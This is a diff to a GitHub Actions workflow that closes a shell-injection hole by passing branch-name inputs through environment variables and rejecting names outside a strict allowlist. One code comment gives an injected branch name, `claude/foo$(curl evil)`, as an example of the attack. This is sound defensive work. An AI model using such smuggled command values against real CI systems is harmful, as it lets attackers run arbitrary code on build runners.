@@ -60,12 +60,38 @@ jobs:
 
       - name: Determine source branch
         id: branch
+        # Untrusted inputs (`github.event.inputs.branch`, `github.ref_name`)
+        # are read via env vars, NOT interpolated directly into the shell
+        # body. A branch named e.g. `claude/foo$(curl evil)` would otherwise
+        # let a workflow_dispatch caller — or a push of a pathological branch
+        # name — execute arbitrary shell here.
+        env:
+          INPUT_BRANCH: ${{ github.event.inputs.branch }}
+          REF_BRANCH: ${{ github.ref_name }}
         run: |
-          if [ -n "${{ github.event.inputs.branch }}" ]; then
-            echo "name=${{ github.event.inputs.branch }}" >> "$GITHUB_OUTPUT"
+          set -euo pipefail
+          if [ -n "${INPUT_BRANCH:-}" ]; then
+            BRANCH="$INPUT_BRANCH"
           else
-            echo "name=${{ github.ref_name }}" >> "$GITHUB_OUTPUT"
+            BRANCH="$REF_BRANCH"
           fi
+          # Strict allowlist for the branch name — must be `claude/<token>`
+          # where token is alphanumeric + `-` `_` `.` `/`. Anything else
+          # is rejected loudly. This is defence-in-depth: branch names with
+          # shell metacharacters cannot have come from the routine, but a
+          # workflow_dispatch caller could attempt one.
+          case "$BRANCH" in
+            claude/*) ;;
+            *)
+              echo "refused: branch '$BRANCH' is not under claude/" >&2
+              exit 1
+              ;;
+          esac
+          if printf '%s' "$BRANCH" | grep -qE '[^A-Za-z0-9._/-]'; then
+            echo "refused: branch '$BRANCH' contains disallowed characters" >&2
+            exit 1
+          fi
+          echo "name=$BRANCH" >> "$GITHUB_OUTPUT"
 
       - name: Fast-forward main from feature branch
         env:
@@ -73,7 +99,8 @@ jobs:
         run: |
           set -euo pipefail
 
-          # Pull the feature branch into local refs.
+          # Pull the feature branch into local refs. The strict allowlist
+          # in the previous step guarantees `$BRANCH` cannot start with `-`.
           git fetch origin "$BRANCH"
 
           # Only merge if it is a strict descendant of main.
